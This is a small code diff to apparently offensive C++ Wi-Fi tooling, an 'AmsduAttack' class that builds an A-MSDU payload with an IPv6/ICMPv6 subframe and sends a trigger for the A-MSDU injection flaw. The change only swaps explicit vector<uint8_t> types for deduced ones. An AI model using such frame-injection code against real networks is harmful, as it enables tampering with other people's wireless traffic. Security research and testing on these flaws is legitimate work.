@@ -167,7 +167,7 @@ vector<uint8_t> AmsduAttack::build_amsdu_payload() const {
     for(auto b : dst_v6) ipv6.push_back(b);
     ipv6.insert(ipv6.end(), icmpv6.begin(), icmpv6.end());
 
-    vector<uint8_t> sf2_data(SNAP_IPV6, SNAP_IPV6 + 8);
+    vector sf2_data(SNAP_IPV6, SNAP_IPV6 + 8);
     sf2_data.insert(sf2_data.end(), ipv6.begin(), ipv6.end());
 
     const HWAddress<6> bcast("ff:ff:ff:ff:ff:ff");
@@ -234,7 +234,7 @@ void AmsduAttack::send_trigger_24588() {
 
     // TCP payload = sf2 (bytes [20..] of full A-MSDU payload)
     const auto full = build_amsdu_payload();
-    const vector<uint8_t> sf2(full.begin() + 20, full.end());
+    const vector sf2(full.begin() + 20, full.end());
 
     struct sockaddr_in dst{};
     dst.sin_family = AF_INET;
